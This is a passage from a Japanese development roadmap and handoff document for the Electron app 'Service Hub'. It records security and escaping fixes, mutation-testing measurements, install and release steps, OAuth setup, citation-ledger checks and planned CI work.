| `redactSecrets(body).slice(0, 200)` | 0 |

閉じ引用符がちょうど切り口の外側に落ちる位置 (詰め物 116) では、本文に
トークン全体が見えているのに規則が当たらない。**断片ではなく丸ごと出る。**
対象には `main/oauth.ts` のトークン交換・更新の失敗応答と、
`renderer/network/proxy.ts` (プロキシ運用者の応答が Authorization を
echo しうる経路) が含まれる。

`shared/redact.ts` に `redactForMessage(body, max)` を 1 つ置いて 17 箇所を
寄せた。走査は `REDACT_SCAN_LIMIT` (8192) で頭打ち。**同じ問題が 8192 に
移るのではないか**という疑いは当たらない — 困るのは「maxLength より前から
始まり 8192 より後で終わる秘密」だけで、1 つのトークンが約 8000 文字ある
という意味になる。上限は出力の上限でもある (先に切る→伏せる→また切る)
ので、伏せられていない文字が上限の外から出てくる経路は無い。
`lint:forbidden` に再発を落とす規則を足し、対照実験で確認した。

**教訓**: 「1 点で確かめると、たまたま安全な位置を選んでしまう」。
最初に書いた再現では詰め物 120 を選んでしまい 11 文字しか漏れず、
総当りで初めて 60 文字 (全部) の位置が見つかった。境界が絡む検査は
**位置を振る**こと。

#### ついでに見つかった検査漏れ

`pkce.ts` の `.replace(/\//g, '_')` を `''` にした変異体が生存していた —
**`/` が `_` になることを誰も見ていなかった**。`generatePkce` 経由の既存の
検査は `/^[A-Za-z0-9_-]+$/` を見ているが、**`/` を消してもその文字クラスは
満たされる**ので落ちない。「一見すると守っているように見える検査」の例。
`base64UrlEncode` を公開して対応表を直に固定した (155 mutants 100%)。

### 書き出しの Markdown だけエスケープが割れていた (2026-08-21)

ダッシュボードの Markdown 書き出しは 3 箇所あり、守り方が 3 通りだった。

| 書き出し | 直す前 |
|---|---|
| `main/clients/stocks.ts` | 関数内に `escMd = s => s.replace(/\|/g,'\\|')` |
| `renderer/data/stocksAnalysisWeb.ts` | **何もしていない** |
| `main/clients/business.ts` | **何もしていない** |

同じデータの HTML 版はいずれも `escapeXml` を通していた。**Markdown 側だけ
守りが片方にしか無い**という形である。

埋まるのは利用者が打った銘柄名や事業ラベルだけではなく、**AI アドバイザーの
応答** (`rationale` / `riskFactors` / `actionItems` / `categoryId`)。受け口の
検査は「空でない文字列」または「配列であること」しか見ていない。

- `|` 1 つで表の桁がずれる (日本語の散文に `|` は普通に出る)
- **改行があると行が終わる。** 続きは新しい Markdown の構造として読まれ、
  `|---|` を書けば表そのものを作り直せる。壊れるのではなく**差し替わる**
- `<` が素通しなので生 HTML が通る。Markdown の描画系はたいてい生 HTML を
  通すので、ここがスクリプト実行の経路になる。書き出した `.md` はライブラリに
  残り人に渡る (このリポジトリ自身が Obsidian の保管庫を持っている)

`shared/escape.ts` に 2 つ足して文脈で使い分ける形にした:

- `escapeMarkdownInline` — 1 行で終わらなければならない場所すべて
  (表のセル・見出し・箇条書きの 1 項目・引用の 1 行)。`\` を最初に逃がし、
  `|`・改行・`<` を落とす
- `escapeMarkdownText` — 段落。落とすのは `<` だけ。改行は残す

`&` は落とさない。実体参照は CommonMark §2.5 で文字として扱われ markup に
ならないので安全のために要らず、素の viewer で `&amp;` が見えるだけ損。
**見出しや引用を後から足されることは防いでいない** — 行頭記号を全部潰すと
まともな文章が書けないため、承知のうえで通している (`escape.ts` に明記)。

#### なぜ気付かなかったか

`lint:forbidden` の #11 が「エスケープの自前実装」を落としているのに素通り
していたのは、**検出が HTML/XML の形しか見ていなかった**から (`&amp;` の
実体参照と `[&<>]` の文字クラス)。`|` を落とすだけの形は網に掛からず、
しかも 1 箇所にしか無いので写経とも気付かれなかった。#11 に
`.replace(/\|/g, …)` を足し、対照実験で実際に鳴ることを確かめた。

`stocksAnalysisWeb.test.ts` の golden は `| X< | Y& |` を期待していた。
**穴を固定していた**のであって捕まえてはいなかった — 同じ入れ物を使う
HTML の golden はすぐ上で `X&lt;` を期待しており、「escaping」という名前
まで付いていた。罠 2-c の系統 (「落ちないテスト」) に**「間違った答えを
正解として書き留めたテスト」**を加える。

### IPC 境界の型ガードが要素の中身を検査していなかった (2026-08-21)

`isAdvisorResult` は stocks.ts / business.ts の両方にあり、どちらも
`recommendations` が**配列かどうかしか見ていなかった**。business.ts の方には
「conservative: only accepts structures that pass the same validator used when
the LLM produced them」と書いてあったが事実ではなく、同じファイルの
`validateBusinessAdvisorJson` (「throws on any deviation so a malformed reply
can't smuggle bad data into the UI」) は全要素・全項目を検査している。
**同じファイルの中に同じデータの検査が 2 つあり、境界を守っている方が空。**

TypeScript の型は IPC を越えない。実測:

    recommendations: [null]  → Cannot read properties of null (reading 'rank')
    actionItems 欠落         → Cannot read properties of undefined (reading 'map')
    rationale が数値         → input.replace is not a function

いずれも書き出しの最中に投げる。invoke ハンドラが受けるのでクラッシュは
しないが、**書き出しは丸ごと失敗しファイルは 1 バイトも書かれない**。

検査を 1 つに寄せ、guard から厳密な方を呼ぶようにした。

#### 途中で 1 つ間違えた — 記録しておく

stocks 側で銘柄の許可リストにスナップショットのウォッチリストを使おうと
したところ、既存の検査 2 件が落ちた。**助言の宇宙はウォッチリストではない**
— `advise` の `universe` payload か `MOCK_TICKERS` から来る。知らないものを
知っているふりで絞ると、正しい助言を黙って捨てることになる。
`validateAdvisorJson` の許可リストを `ReadonlySet | null` にし、
null = 「この場では宇宙が分からない」として所属ではなく `isSafeSymbol` (形)
で判定する形にした。「絞りすぎていない」ことを確かめる検査も両方に置いた。

#### 変異検査で分かった形の問題 (2 件・どちらも pragma を使わずに消した)

- `catch { return false }` は**中身を消しても結果が変わらない** — 暗黙の
  `undefined` を返し、呼び出し側はどちらも偽として扱う。「投げなければ真」を
  1 つの変数で表す形に変えた (空の catch には BlockStatement 変異体が
  作られない)
- 銘柄判定を三項で書くと既存の `Stryker disable ConditionalExpression` の帯
  (32 行に伸びた) に飲まれ、新しい分岐がそのまま「測っていない」になる。
  `lint:mutation-scope` がこれを落としたので、判定を `advisorSymbolAllowed`
  として帯の外へ出した

### 壁の一覧を「自称」で洗い直した — 10 → 17 (2026-08-20)

`MUST_MEASURE` は 2 度直しているが、どちらも**そのとき見つけたものを足しただけ**
だった。一覧そのものが網羅的かを確かめるため、基準を決めて機械的に洗った:
`mutate` 全 226 件の冒頭 30 行を「関門 / fail-closed / SSRF / 送り先 / 踏み台 /
絞る / 1 本の口」で走査し、**モジュールが自分の説明文で門だと名乗っているもの**を
全部拾う。7 件出た (`proxyEndpoint` / `aiEndpoint` / `atlassianSite` / `tokenInput` /
`scanTarget` / `liveRead` / `webauthn`)。

6 件は既に `mutate` に在籍していて実測 100% — 測られてはいたが**外されても誰も
気付かない**状態だった。宣言はそこを塞ぐ。

**`src/renderer/security/webauthn.ts` だけは `mutate` にも無かった。** 実測
**68 変異体 61.76% (生存 26)**。このモジュールは誰からも呼ばれていない —
存在理由は「将来これを解錠ゲートへ配線する人に条件を残すこと」で、冒頭に
不変条件が 4 つ書いてある。ところが **`userVerification: 'required'` を空文字に
書き換えてもどの検査も落ちなかった**。条件を書いた場所が、条件を守らせて
いなかった。不変条件を 1 つずつ固定して **53 変異体 100%**。

ついでに死んでいたコードが 1 つ見つかった: `atob` は仕様上 `=` を取り除いてから
復号する (HTML の forgiving-base64 decode) ので、`base64urlToBuffer` の
**パディング復元は結果を変えていなかった**。削除した。

### 「無視された変異体」を数えてみた — 疑いは外れた (2026-08-20 実測)

宣言した壁 10 ファイルがすべて 100% と出るので、**その 100% は何の 100% なのか**を
確かめた。Stryker の `Ignored` は分子からも分母からも消えるため、多ければ
「測っていない範囲が 100% の陰に隠れている」ことになる。

実測: 壁 10 ファイル 2,165 変異体のうち **`Ignored` は 386 件 (17.8%)**。
数だけ見ると大きいが、**内訳を見ると疑いは外れた**。

| 内訳 | 件数 | 中身 |
|---|---|---|
| 理由つき `Stryker disable` | 約 340 | 1 行ずつ**日本語で理由が書いてある** (到達不能な IndexedDB のエラー経路 / jsdom では再現できない DOM 有無の分岐 / `clearTimeout(null)` の等価性 など) |
| `ignoreStatic` による除外 | 約 37 | モジュール定数の初期化 (`INTERNAL_TLDS` / `LOOPBACK_HOSTS` / `MODEL_NAME_RE` / DB 名など) |

実測値 (3 ファイルを詳細集計): `proxy.ts` 151 件中 `ignoreStatic` は 17 /
`vault.ts` 72 件中 0 / `ollama.ts` 60 件中 17 / `autoLock.ts` 41 件中 0 /
`fsa.ts` 29 件中 3 / `pkce.ts` 7 件中 0。

**`ignoreStatic` の分も、中身の振る舞いは検査で押さえてある。** 例えば
`INTERNAL_TLDS` の各エントリは `pri('http://dc01.corp/') === true` の形で個別に
固定されており、表から `'corp'` を消せばその検査が落ちる。表リテラルの変異体が
殺せないのは、モジュールが変異体の有効化より前に読み込まれるという**測定側の
都合**であって、守りが無いという意味ではない。

つまり **386 件は「隠れた未測定」ではなく「測らないと決めた範囲の台帳」**である。
`lint:mutation-scope` が広い無効化を禁じているので、1 件ずつ理由を書く形に
落ちている — 数が多いのはその結果であって、緩んでいるからではない。

**探して無かったことも記録に残す。** 同じ疑いを次に持った人が 55 分の実測を
繰り返さずに済むように、この節を置く。数を減らしたいなら `ignoreStatic` の分
(約 37 件) を `vi.resetModules()` + 動的 `import()` で読み直して殺すのが筋だが、
振る舞いは既に押さえてあるので**優先度は低い**。

### static 変異体について (2026-08-18 に方針を決め、同日に**訂正**した)

> **訂正**: 当初「static 変異体は構造的に殺せない」と書き、`ignoreStatic: true` を
> その対処として入れた。**これは不正確だった。** `ignoreStatic` が無視するのは
> 「どのテストにも覆われていない static 変異体」だけで、覆われているものは実行され、
> モジュールが変異体の有効化より前に読み込まれているために『生存』と報告される。
>
> 実測で差が出た: `ai/providers.ts` は未到達 static だったので `ignoreStatic` で
> 消えたが、`oauth.ts` の `OAUTH_CONFIGS` は**覆われた** static だったため 103 件が
> そのまま残った。
>
> **覆われた static 変異体は、テスト側でモジュールを読み直せば殺せる。**
> `vi.resetModules()` + 動的 `await import()` で毎回評価し直すと、表を書き換える
> 変異体が比較で落ちる (`oauth.test.ts` の `freshConfigs` / `freshListen`。
> これで 70.05% → 92.13% に上がった)。
>
> つまり定数表・レジストリの類は「測れない」のではなく **読み直せば測れる**。
> `ignoreStatic` は未到達の static を赤として残さないための設定であって、
> テストを書かない口実にはしない。



モジュール読み込み時に一度だけ評価される初期化コード (定数テーブル / レジストリ /
設定オブジェクト) の変異体は、vitest がモジュールを変異体ごとに読み直さないため
**構造的に殺せない**。既定のままだと「生存」として報告され、テストの不足と
区別が付かなくなる。

`providers.ts` で実測したところ、生存 48 件のうち **40 件が static** だった
(Stryker の JSON レポート — reports/mutation 配下の生成物 — の `static: true` で判別できる)。殺せない赤は
「常に緑を返すゲート」と同じで、本物の不足を埋もれさせる。

そこで `stryker.config.json` に `ignoreStatic: true` を入れた。変異体を生成しない
だけなので**既に 100% のファイルのスコアは変わらない** (consolidation.ts で実測確認)。
副作用として、モジュール初期化コードの誤りは変異検査では見つからない — そこは
起動時の不変条件チェック (`AI_PROVIDERS` の id 照合など) とユニットテストで担保する。

この方針変更で、台帳に残っている行数は**「まだ測っていない実コード」だけ**を
指すようになった (static 変異体を隠すための無効化と混ざらなくなった)。

**効果は大きかった。** `ignoreStatic` を入れた直後に 18 ファイルの無効化を外して
実測したところ、**テストを 1 行も足さずに全ファイルが 100%** だった — つまり
それらの無効化は最初から static 変異体を隠すためだけに存在していた:

| ファイル | 無効化を外した後 |
|---|---|
| `connectorCatalog.ts` / `welfareDocs.ts` / `selfCareLibrary.ts` / `counselingResearch.ts` | 100% (台帳から 4 件退場) |
| `taxGift.ts` | 100% (台帳から 1 件退場) |
| `taxStampDuty.ts` / `taxRegistrationLicense.ts` / `taxAutomobile.ts` / `taxRealEstateAcquisition.ts` / `taxInheritance.ts` / `taxNationalHealthInsurance.ts` / `taxNationalPension.ts` | 100% (台帳外だが測定対象が増えた) |

さらに 5 ファイル (`voiceCommand.ts` / `dbSecurityPosture.ts` / `securityRange.ts` /
`taxCorporate.ts` / `taxSocialInsurance.ts`) も同じくテスト追加なしで 100% だった。
**合計 23 ファイルの無効化が static 隠しだけだった**ことになる。

### 残り 2 ファイルの実測値 (2026-08-18・無効化を外して測った)

ここから先はテストを足さないと上がらない。低い順:

| スコア | ファイル | 生存 + 未到達 |
|---|---|---|
| 74.4% | `src/main/clients/business.ts` | 142 |
| 78.9% | `src/main/clients/stocks.ts` | 275 |

SaaS クライアントの薄いもの (`drive` / `wordpress` / `notion` / `canva` /
`calendar` / `templates`) と security 系はすべて消化済み (下の表を参照)。
残っているのは **2 つだけ** — `business` 199 / `stocks` 169 (ほかに
`templates` の座標算術 139 行)。**次は `business.ts` (74.4%)**。

### 進め方 (store.ts で通った手順)

1. 該当ファイルの範囲指定 disable を外し、`rm -f .stryker-incremental.json && rm -rf .stryker-tmp`
   してから `npx stryker run --mutate <file>` で**実測**する (キャッシュが残ると誤報が出る)
2. 生存変異体を「実装されているのに何も証明していない契約」と「本当の等価変異」に仕分ける
3. 前者は**公開 API 越しに**テストを足す (内部関数を export して直接叩くと
   「関数は正しいが呼ばれていない」を見逃す)
4. 後者は**まずコードを単純化できないか**疑う。`store.ts` では uuid の組み立てを
   添字アクセスから `Array.from` の走査へ変えるだけで、到達しない `?? 0` が 2 つ消えた
5. どうしても残るものだけ `Stryker disable next-line <Mutator>: <理由>` にする
   (範囲指定にしない)
6. `KNOWN_BROAD` から当該行を削除し、`lint:mutation-scope` が緑になることを確認する


## Phase 0: 今すぐ自分のデスクトップで起動する（5 分）

### Linux x86-64

AppImage は **GitHub Release から直接ダウンロード**する（リポジトリを clone する必要はない）:

```bash
# v0.1.0 の資産一覧: https://github.com/hiroto1977/-/releases/tag/v0.1.0
curl -L -o ServiceHub.AppImage \
  "https://github.com/hiroto1977/-/releases/download/v0.1.0/Service.Hub-0.1.0.AppImage"
chmod +x ServiceHub.AppImage
./ServiceHub.AppImage
```

ファイラから AppImage をダブルクリックでも可。FUSE が無い環境では:

```bash
./ServiceHub.AppImage --appimage-extract
./squashfs-root/AppRun
```

> **注**: 以前は `dist-chunks/part-*` を git に載せて `scripts/assemble-appimage.sh` で
> 再結合していたが、Release が AppImage を直接配布するようになったため
> `dist-chunks/`（106MB）は追跡対象から外した。過去のコミットを checkout すれば
> 従来手順も使える。

### ブラウザ版（インストール不要・最速）

```
https://hiroto1977.github.io/-/app.html      # フル版
https://hiroto1977.github.io/-/lite.html     # モバイル用ライト版（約 2.7MB）
```

ローカルで作る場合は `npm run build:web` → `dist/standalone.html`
（生成物のため git では追跡していない）。

### Mac / Windows / その他

```bash
git fetch origin
git checkout claude/add-claude-documentation-F7HIa
git pull
npm install
npm run dev        # ホットリロード開発モード
# または
npm run build      # release/ に .dmg / .exe を出力
```

### 動作確認チェックリスト

- [ ] Electron ウィンドウが開く
- [ ] サイドバーに 74 サービスがカテゴリ別（おすすめ / 士業連携 / 分析・ツール / 外部サービス連携）で表示される
- [ ] 各タブをクリックしてスナップショットデータが表示される
- [ ] GitHub タブで「PAT を設定」 → PAT を貼り付け → 「保存」 → バッジが `Live` に変わる
- [ ] 「更新」ボタンで再フェッチ → 最新の自分の PR が表示される

---

## Phase 1: PR レビュー & main へマージ（30 分）

### 1-1. PR を ready にする

GitHub UI で PR #2 を開き、「Ready for review」をクリック。または:

```bash
gh pr ready 2     # gh CLI を使う場合
```

### 1-2. セルフレビュー観点

- `src/main/main.ts` の IPC ハンドラ群（`fetch:snapshot` の error 包装、`secrets:*` の入力検証）
- `src/main/secrets.ts` の `safeStorage` 不在時フォールバックの暗号強度（現在 plain base64 = 平文相当）
- 各 fetcher の URL ハードコーディング — `src/main/clients/*.ts`
- `tokenSetup` の placeholder に書いた認証情報フォーマットが正確か

### 1-3. main にマージ

レビュー OK なら GitHub UI から Squash merge。マージ後:

```bash
git checkout main
git pull
git branch -d claude/add-claude-documentation-F7HIa
```

### 1-4. GitHub Release 作成（任意）

`v0.1.0` タグを切って Release 化。AppImage を assets に添付:

```bash
git tag v0.1.0 && git push origin v0.1.0
gh release create v0.1.0 "release/Service Hub-0.1.0.AppImage" \
  --title "Service Hub v0.1.0" \
  --notes "Initial release: 9-service dashboard with live REST fetchers"
```

これで `dist-chunks/` を git から削除して履歴を綺麗にする選択肢が生まれる
（既存履歴の rewrite は別作業。BFG repo-cleaner を使う）。

---

## Phase 2: スナップショットを最新化する（10 分、必要時）

`src/renderer/data/snapshot.ts` は手動更新。Claude Code で各 MCP ツールを叩き、
結果を貼り直す:

| サービス | MCP ツール |
|---|---|
| GitHub | `mcp__github__get_me`, `mcp__github__list_pull_requests` |
| WordPress | `mcp__1162bffd...wpcom-user-sites` |
| Atlassian | `mcp__3245dd75...getAccessibleAtlassianResources` + `getVisibleJiraProjects` |
| Notion | `mcp__11127ca0...notion-search` |
| Drive | `mcp__8854cd8f...list_recent_files` |
| Calendar | `mcp__9789a00e...list_calendars`, `list_events` |
| Gmail | `mcp__9fcfcbe6...search_threads` |
| Slack | `mcp__d20bd3b1...slack_search_channels` |
| Canva | `mcp__c7c3b64a...search-designs`, `list-brand-kits` |

将来的にこの手動ステップを廃止するには Phase 5 の自動更新ジョブを参照。

---

## Phase 3: アイコン / ブランディング（30 分）

現状は Electron デフォルトアイコン (`default Electron icon is used` の警告)。

### 手順

1. `512x512` の PNG を `build/icon.png` に置く
2. `electron-builder.json` に追記:
   ```json
   "mac":   { "target": "dmg", "icon": "build/icon.png" },
   "win":   { "target": "nsis", "icon": "build/icon.png" },
   "linux": { "target": "AppImage", "icon": "build/icon.png" }
   ```
3. アプリ表示名やバンドル ID の調整: `package.json` の `author`、`electron-builder.json` の `productName` / `appId`
4. `npm run build` で再生成 → アイコンが反映される

### Mac の DMG 背景画像（任意）

`build/background.png` (540x380 推奨) を置き、`electron-builder.json` で
`"dmg": { "background": "build/background.png" }` を指定。

---

## Phase 4: OAuth code flow ✅ 基盤実装済み

PKCE-based Authorization Code (RFC 7636 + RFC 8252) を main プロセスに実装。
ループバックサーバ・state 検証・token refresh まで含む完全フロー。
**10 プロバイダ配線済み** — Google 3 種 (Drive / Calendar / Gmail、単一 client ID で
3 サービスをカバー) + freee / Microsoft 365 / Slack / Notion / Canva / WordPress.com /
Atlassian。詳細は `docs/OAUTH_SETUP.md`。

うち Notion / Canva / WordPress.com / Atlassian は **機密クライアント**で、
公式ドキュメント上 token 交換に client_secret が要る。`OAuthConfig` に
`pkce` / `clientSecret` / `clientAuth` (`none`|`basic`|`body`) / `tokenBodyFormat`
(`form`|`json`) を足して表現した。既存 5 件は既定値のままなので**通信内容は不変**。

残作業: 各プロバイダの開発者コンソールで client ID / secret を取得し環境変数へ渡す
(`*_OAUTH_CLIENT_ID` / `*_OAUTH_CLIENT_SECRET`)。**実 API での疎通確認は未実施** —
エンドポイントとスコープは公式ドキュメントと各社公開の OpenAPI / SDK ソースで
裏取りしたが、実際に認可画面まで通したわけではない。

未確定のまま入れなかったもの:
- Canva の `brand-kits` スコープ — `GET /v1/brand-kits` は Canva 公開 OpenAPI に
  存在せず必要スコープを確定できない。`clients/canva.ts` は 403/404 を握って
  デグレードするので実害なし。
- WordPress.com の `oauth2-1/token` (PKCE・secret 不要) — 検索結果には出るが
  REST API 一般に使えるのか確証が取れず、確認済みの `/oauth2/*` + secret を採用。
  もし一般に使えるなら WordPress も公開クライアントにできる。

---

## 使わない資格情報を求めていた画面 8 つ — 対応済み (2026-08-17)

`dropbox` / `salesforce` / `discord` / `asana` / `linear` / `sentry` / `stripe` / `line` は
fetcher も write アクションも資格情報を読まないのに、トークン入力欄を出して
`safeStorage`（ブラウザ版は Vault）で暗号化保存していた。**読み手のいない資格情報を
預かること自体が漏えい面**であり、利用者からは「入れれば繋がる」という誤解にもなる。

対応:

- `src/shared/credentialUse.ts` で用途を宣言（fetch 15 / action 8 / none 51）
- `StatusBar` は `none` なら `tokenSetup` を無視する（判定は 1 か所）
- 該当 8 ページから `tokenSetup` 自体も外した
- **保存済みの分の掃除**: 設定画面の「使われていない資格情報」節から個別に削除できる
  （入力欄を消すと「削除」ボタンも消えるため、出口を別に用意する必要があった）
- `lint:credential-use`（21 ゲート目）が宣言・実装・画面を双方向に照合し、
  `none` のサービスに `tokenSetup` を書いたページがあれば落ちる

`shopify` は fetcher が stub だがアクションが実際に通信するため対象外。

---

## セキュリティ診断が「無い」と「確認できない」を区別できない

2026-08-17 に `autoLockEnabled` を実測へ切り替えた（診断が「自動ロック: 未対応」と
告げていたが、ブラウザ版では実際に動いていた）。残る 2 項目は**まだ観測していない**:

| 項目 | 現状 | なぜ |
|---|---|---|
| `integrityVerified` | `false` 固定 | レコードストアの改ざん検知は常時検証が未配線 |
| `cloudBackup` | 実際に 0 件 | クラウド同期パネルはデモで、構成が永続化されない |

`cloudBackup: []` は**嘘ではない**（構成が存在しない）。問題は
`integrityVerified` のほうで、`buildDbSecurityReport` の入力が `boolean` しか
取れないため「確認していない」を「対応していない」として点数から差し引いている。
利用者から見ると、**手を打っても消えない改善候補**が常に残る。診断が消えない
指摘を出し続けると、読む側は診断全体を無視するようになる（「常に緑を返すゲートは
無いより悪い」の裏返し）。

直し方は決めていないので未着手:

- `SecurityCheck` に `status: 'ok' | 'missing' | 'unknown'` を持たせ、`unknown` を
  改善候補と別枠で出す。点数は「確認できた項目のうち」の比率にするか、`unknown` を
  減点のまま**表示だけ分ける**かで、意味が変わる。
  - 比率にすると、観測を増やすほど点が動いて履歴が比較できなくなる。
  - 減点のままにすると、満点に到達できないままである。
- どちらを選ぶかは「診断が何を約束するか」の決定なので、実装より先にそこを決める。

`autoLock` の実測は `src/renderer/data/dbPosture.ts` に置いた。次に観測を増やす時も
画面の中ではなくここへ足すこと（画面の中で組み立てると、実測を定数へ戻しても
テストが緑のまま通る）。

---

## バンドルサイズの実測と上限方針の不在

2026-08-11 実測（同一マシン・同一コミット）:

| ビルド | 実測 | ドキュメント記載（当時） |
|---|---|---|
| `build:web` | **10.68 MiB** (11,200,073 B) | 「~10 MB」 |
| `build:web:lite` | **2.59 MiB** (2,719,547 B) | 「~2.2 MB」 |

LITE が想定より **+18%** 育っている。増分は学術コーパスではなく
compliance / subsidy / counselor / econ-history のデータ（LITE は
学術コーパスを積んでいない）。CLAUDE.md の記載を実測値へ更新した。

**上限の現況（2026-08-11 に確認して訂正）。** 当初「上限が無い」と書いたが
**それは誤りだった** — `ci.yml` の size 検証は LITE に以前から
**4,000,000 B の天井**を置いている（実測 2,719,547 B ＝ 予算の 68%）。
青天井だったのは**フル版**のほうで、下限 100,000 B しか無かった。
そこでフル版にも 16,000,000 B の天井を追加した（実測比 約 43% の余裕。
通常のコーパス増加では当たらず、巨大アセットの誤同梱や遅延ロードの
解除といった桁違いの増加でだけ落ちる位置）。

残る課題は**天井に近づいたことを事前に知る手段が無い**こと。今は
「通る／落ちる」の二値で、LITE が 4MB へ寄っていく過程が見えない。
予算消費率を出して 80% 超で警告するのが素直だが、警告を CI のどこに
出すか（step summary か、独立ゲートか）を決めていないので未着手。
なお `perf` ゲートは起動時の巨大 JSON.parse (`bigParses`) を見るもので
サイズとは別軸、かつ CI では走らない（実ブラウザが要るため）。

なお `perf` の DCL などの絶対値は**機械依存**で、別マシンの記録と
比較してはいけない（SESSION_HANDOFF の罠 6 参照）。

---

## 出典照合 — 完了（台帳 4 つとも空）

**出典台帳の未確認件数: **0 件****

`lint:doi-prefix` は 4 つの台帳を持ち、いずれも**双方向**（直したのに載っていたら落ちる）。
2026-08-17 時点で 4 つとも空である:

| 台帳 | 何を退避するか | 現在 |
|---|---|---|
| `ALLOWLIST` | DOI プレフィックスとラベルの出版社が矛盾 | 0 件 |
| `ISBN_ALLOWLIST` | 書籍 DOI の ISBN-13 チェックディジット不正 | 0 件 |
| `JOURNAL_ALLOWLIST` | 同一出版社内で誌コードとラベルが不一致 | 0 件 |
| `DUPLICATE_ID_ALLOWLIST` | 同一文献に別々の識別子 | 0 件 |

実測（`npm run lint:doi-prefix`）: 書籍 DOI 316 件のチェックディジット、
DOI 234 件の誌コード、文献 2,206 件の識別子衝突、DOI 出典 919 件のプレフィックス —
**すべて 0 件**。`lint:citations`（同一 DOI が別々の出版年で引かれていないか）も
DOI 2,276 件で 0 件。

**この節は 2026-08-17 まで「残り 18 件」と書かれていたが、実体は空だった。**
終わった作業を「未完了」として掲げると、次に読む人が済んだ場所を掘り直す。
再発しないよう、上の「未確認件数」は `lint:docs` が台帳の実体と突き合わせる
（`cross-doc-consistency.cjs` の `citation ledger backlog`）。数を書き換えても
台帳を増やしても、片方だけでは落ちる。

### 到達した経緯（次に台帳へ退避する人向け）

- **プレフィックス照合**は当初 134 件を検出し、DOI 差し替え 114 件 + ルール修正 2 件で解消。
  差し替えは**すべて出版社／索引ページで実体を確認してから**行った。確認できなかった
  候補は、もっともらしくても投入していない（**推測で出典を直さない**）。
- **ISBN チェックディジット検査**は外部問い合わせなしに実在性を否定できる。
  Springer の書籍 DOI は `10.1007/<ISBN-13>` の形で ISBN をそのまま含むため、
  末尾の検査数字だけで「この DOI は解決しない」が数学的に確定する。
  検出 24 件は「ISBN の打ち間違い」ではなく **DOI そのものが実在しない**もので
  （ラベルが Springer 以外の版元を名乗るのに DOI が 10.1007 の形）、
  実 DOI が無い書籍は**版元の書誌ページ**へ差し替えて解消した。
- **ラベルの文献自体が疑わしい**型は DOI 差し替えでは直らず、出典ごと差し替える
  判断が要る（例: 実在を確認できない書名）。この型が最後まで残った。
- **報告が割れたら親が一次確認する。** 並列照合で同一文献の可否が食い違った際は、
  親が出版社サイトを直接見て決着させた。
- **真の偽陽性はルールを直す**（台帳に隠さない）。百科事典・ハンドブックは原典の
  掲載誌と収録先の両方を名乗るのが正常、版元が移った誌のレガシー DOI は矛盾ではない、
  の 2 つはルール側で除外した。隠すと将来も誤検出し続ける。

### 照合の制約（変わっていない）

このコンテナからは doi.org / Crossref / OpenAlex / 主要出版社すべてが egress ブロックで、
照合手段は実質 WebSearch のみ。**1 セッションあたり 30〜40 件が現実的な上限**で、
並列度を上げても検索予算を食い合うだけ（4 並列 × 34 件は全員が予算切れ、
3 並列 × 12 件は 36 件すべて判定完了）。手順は「DOI 接尾辞の完全一致検索 →
索引が返す出版社ページの実体を証拠にする」。**検索要約の主張を証拠にしない。**

---

## Phase 5: サービスごとの機能拡張（オープンエンド）

現在は読み取りのみ。書き込み・操作系を順次追加:

| サービス | 候補機能 | 関連 MCP / API |
|---|---|---|
| GitHub | Issue 作成、PR review、CI 状態 | `POST /repos/{o}/{r}/issues`, `/check-runs` |
| WordPress | 投稿のドラフト作成、メディアアップロード | `POST /sites/{id}/posts/new` |
| Atlassian | Jira issue 作成・遷移、Confluence ページ更新 | `POST /rest/api/3/issue`, `PUT /rest/api/3/issue/{id}/transitions` |
| Notion | ページ作成、データベース更新 | `POST /v1/pages`, `PATCH /v1/databases/{id}` |
| Drive | アップロード、共有設定変更 | `POST /upload/drive/v3/files` |
| Calendar | 予定作成・変更、招待応答 | `POST /calendars/{id}/events` |
| Gmail | ドラフト作成、送信、ラベル付与 | `POST /users/me/drafts`, `/labels` |
| Slack | メッセージ送信、Canvas 作成・編集 | `POST /chat.postMessage`, `/canvases.create` |
| Canva | デザイン生成、エクスポート | `POST /v1/designs`, `/v1/exports` |

### 追加方法のパターン

1. `src/main/clients/<service>.ts` に新関数を追加（例: `createJiraIssue`）
2. `LIVE_FETCHERS` とは別の `LIVE_ACTIONS` マップを定義し、`ipcMain.handle('action:invoke', ...)` を main に追加
3. preload に `invokeAction(serviceId, action, payload)` を公開
4. レンダラ各ページに専用の入力フォーム / ボタン

または、シンプルに `serviceHub.action('jira:create', payload)` 形式の単一 IPC で受けて
main 側で分岐する設計でも良い。

---

## Phase 6: Mac / Windows 用インストーラ ✅ v0.1.0 で配布済み（Intel Mac のみ残）

`electron-builder` は **動作させる OS と同じターゲット** をネイティブビルドする
のが安定運用。

### Mac (Apple Silicon と Intel 両方)

Mac 上で:
```bash
npm run build
# release/Service Hub-0.1.0-arm64.dmg と release/Service Hub-0.1.0.dmg
```

### Windows

Windows 上で:
```bash
npm run build
# release/Service Hub Setup 0.1.0.exe (Nullsoft NSIS)
```

### クロスビルドする場合（非推奨だが可能）

Linux から Windows を作る:
```bash
sudo apt-get install wine64
npm run build -- --win
```

Mac は Apple のライセンスで他 OS からのビルドが事実上不可。

---

## Phase 7: 配布・自動アップデート・CI（数日）

### 7-1. コード署名

| OS | 署名証明書 | 必要性 |
|---|---|---|
| Mac | Apple Developer ID ($99/年) + 公証 | 配布で必須（Gatekeeper） |
| Windows | EV コード署名証明書 ($200〜400/年) | SmartScreen 警告回避 |
| Linux | 不要 | AppImage に署名は任意 |

`electron-builder` の `mac.identity`, `win.certificateFile` で設定。

### 7-2. 自動アップデート

`electron-updater` を依存追加し、`src/main/main.ts` に:

```ts
import { autoUpdater } from 'electron-updater';
app.whenReady().then(() => {
  autoUpdater.checkForUpdatesAndNotify();
});
```

GitHub Releases 上のメタファイル (`latest.yml`, `latest-mac.yml`, `latest-linux.yml`)
を自動で読みに行く。Release を作るたびに electron-builder が自動で生成。

### 7-3. GitHub Actions CI ✅ 配備済み

- `.github/workflows/ci.yml` — main / claude/** ブランチへの push + main 宛 PR で
  typecheck + test + build:renderer を自動実行。同じ ref の古い run は
  `concurrency.cancel-in-progress` で自動キャンセル。
- `.github/workflows/release.yml` — `v*` タグ push を契機に Ubuntu / macOS /
  Windows の 3 ランナーが並列で `npm run build` → 各 OS のインストーラを
  GitHub Release にアップロード (`softprops/action-gh-release@v2`)。

初回タグの切り方:

```bash
git checkout main
git pull
git tag v0.1.0
git push origin v0.1.0
# → 3 OS の native installer が GitHub Release v0.1.0 に自動で並ぶ
```

### 7-4. クラッシュレポート / メトリクス（任意）

Sentry / Datadog の Electron SDK を main / renderer 両方に組み込み、起動回数や
